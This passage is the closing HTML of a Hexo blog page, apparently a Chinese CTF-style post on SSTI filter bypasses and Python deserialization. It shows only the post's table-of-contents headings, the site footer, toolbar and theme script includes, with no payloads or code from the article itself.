href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-2"><span class="nav-number">3.4.3.</span> <span class="nav-text">绕过[]过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-%E8%BF%87%E6%BB%A4-3"><span class="nav-number">3.4.4.</span> <span class="nav-text">绕过\{\{过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%8D%95-%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.5.</span> <span class="nav-text">绕过单&#x2F;双引号过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="nav-number">3.4.6.</span> <span class="nav-text">绕过数字过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">3.4.7.</span> <span class="nav-text">绕过关键字</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI-payload"><span class="nav-number">4.</span> <span class="nav-text">SSTI_payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">python反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">5.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E5%AE%9E%E7%94%A8"><span class="nav-number">5.2.</span> <span class="nav-text">简单实用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PVM"><span class="nav-number">5.3.</span> <span class="nav-text">PVM</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86"><span class="nav-number">5.3.1.</span> <span class="nav-text">组成部分</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="nav-number">5.3.2.</span> <span class="nav-text">执行流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="nav-number">5.3.3.</span> <span class="nav-text">指令集</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BA%E7%8E%B0%E4%BD%8D%E7%BD%AE"><span class="nav-number">5.4.</span> <span class="nav-text">漏洞出现位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">5.5.</span> <span class="nav-text">漏洞利用方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%ACpayload"><span class="nav-number">5.6.</span> <span class="nav-text">基本payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-number">5.7.</span> <span class="nav-text">防御方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E4%BF%A9%E9%A2%98"><span class="nav-number">6.</span> <span class="nav-text">做俩题</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2024 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>